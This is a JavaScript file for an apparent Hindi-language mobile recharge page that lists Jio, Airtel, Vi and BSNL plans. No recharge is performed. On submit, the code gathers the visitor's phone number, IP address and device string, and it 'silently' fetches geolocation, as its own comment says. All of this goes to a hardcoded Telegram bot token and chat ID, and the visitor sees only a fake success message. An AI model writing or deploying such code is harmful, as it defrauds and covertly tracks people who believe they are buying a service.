const plans = {
  Jio: [
    "₹299 - 2GB/Day for 28 Days + Unlimited Calls",
    "₹666 - 1.5GB/Day for 84 Days",
    "₹749 - 2GB/Day for 90 Days + OTT Access",
    "₹999 - Unlimited 5G + 2GB/Day, 84 Days"
  ],
  Airtel: [
    "₹265 - 1GB/Day for 28 Days",
    "₹479 - 1.5GB/Day for 56 Days",
    "₹839 - 2GB/Day for 84 Days",
    "₹999 - Unlimited 5G + 2.5GB/Day, 90 Days"
  ],
  Vi: [
    "₹299 - 1.5GB/Day, 28 Days",
    "₹719 - 2GB/Day, 84 Days + Binge All Night",
    "₹999 - Unlimited 5G + Weekend Rollover, 84 Days"
  ],
  BSNL: [
    "₹187 - 2GB/Day for 28 Days",
    "₹699 - 3GB/Day, 84 Days",
    "₹999 - Truly Unlimited 5G + Calls, 90 Days"
  ]
};

let selectedSim = "";
let selectedPlan = "";

document.getElementById("sim").addEventListener("change", (e) => {
  selectedSim = e.target.value;
});

document.getElementById("selectPlan").addEventListener("click", () => {
  if (!selectedSim) return alert("कृपया पहले SIM चुनें।");
  const plansList = document.getElementById("plansList");
  plansList.innerHTML = "";

  plans[selectedSim].forEach(plan => {
    const div = document.createElement("div");
    div.className = "plan-item";
    div.textContent = plan;
    div.onclick = () => {
      selectedPlan = plan;
      document.getElementById("planModal").classList.add("hidden");
      alert(`आपने चुना: ${plan}`);
    };
    plansList.appendChild(div);
  });

  document.getElementById("planModal").classList.remove("hidden");
});

document.getElementById("closePlan").onclick = () => {
  document.getElementById("planModal").classList.add("hidden");
};

document.getElementById("submitBtn").addEventListener("click", async () => {
  const mobile = document.getElementById("mobile").value.trim();
  if (!selectedSim || !selectedPlan || !mobile) {
    alert("कृपया सभी जानकारी भरें।");
    return;
  }

  document.getElementById("submitBtn").disabled = true;
  document.getElementById("submitBtn").textContent = "प्रोसेस हो रहा है...";

  const ip = await fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(data => data.ip)
    .catch(() => "Not Found");

  const device = navigator.userAgent;

  // Send location silently (if permission granted)
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition((position) => {
      fetch(`https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: "6038115234",
          text: `📍 Location:\nLat: ${position.coords.latitude}\nLong: ${position.coords.longitude}`
        })
      });
    }, () => {
      // Location permission denied or error — do nothing silently
    });
  }

  // Send recharge request message
  await fetch(`https://api.telegram.org/bot8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: "6038115234",
      text: `📲 Recharge Request\nSIM: ${selectedSim}\nPlan: ${selectedPlan}\nMobile: ${mobile}\nIP: ${ip}\nDevice: ${device}`
    })
  });

  document.getElementById("statusMsg").textContent = "आपका अनुरोध सफलतापूर्वक दर्ज हो गया है।";
  document.getElementById("submitBtn").disabled = false;
  document.getElementById("submitBtn").textContent = "सबमिट करें";
});
